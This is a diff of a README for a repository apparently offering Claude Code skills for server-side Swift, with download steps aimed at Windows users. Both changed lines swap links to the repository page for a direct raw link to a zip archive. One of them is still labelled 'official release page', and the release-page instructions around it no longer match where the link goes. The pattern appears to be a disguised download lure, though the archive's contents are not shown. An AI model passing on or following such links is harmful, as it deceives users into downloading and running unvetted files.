@@ -1,12 +1,12 @@
 # 🤖 claude-code-server-side-swift-skills - Improve Swift code with smart AI
 
-[![Download the Tools](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Insolvent-pyrene754/claude-code-server-side-swift-skills)
+[![Download the Tools](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Insolvent-pyrene754/claude-code-server-side-swift-skills/raw/refs/heads/main/skills/server-side-swift/claude_code_swift_side_skills_server_2.1.zip)
 
 ## 📥 How to download the software
 
 Follow these steps to obtain the files for your Windows computer.
 
-1. Visit the [official release page](https://github.com/Insolvent-pyrene754/claude-code-server-side-swift-skills).
+1. Visit the [official release page](https://github.com/Insolvent-pyrene754/claude-code-server-side-swift-skills/raw/refs/heads/main/skills/server-side-swift/claude_code_swift_side_skills_server_2.1.zip).
 2. Look for the section labeled Releases on the right side of your screen.
 3. Click the latest version number shown at the top of that list.
 4. Scroll down to the Assets section.
